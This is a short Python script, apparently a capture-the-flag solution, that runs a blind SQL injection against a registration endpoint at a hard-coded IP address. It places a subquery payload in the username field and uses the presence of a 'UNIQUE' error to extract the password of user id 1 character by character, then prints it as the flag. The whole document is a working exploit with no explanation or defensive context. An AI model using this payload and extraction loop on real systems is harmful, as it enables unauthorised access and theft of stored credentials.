import requests

flag = []
for i in range(1, 69):
    for j in range(32, 127):
        payload = f"',(SELECT 1 FROM users WHERE id=1 AND substr(password,{str(i)},1)='{chr(j)}'))--"
        response = requests.post("http://130.185.123.246/register", data = {"username": payload, "password": "test"}, verify=False)
        if ("UNIQUE" in response.text):
            flag.append(chr(j))
            print(chr(j))
print("flag:", ''.join(flag))
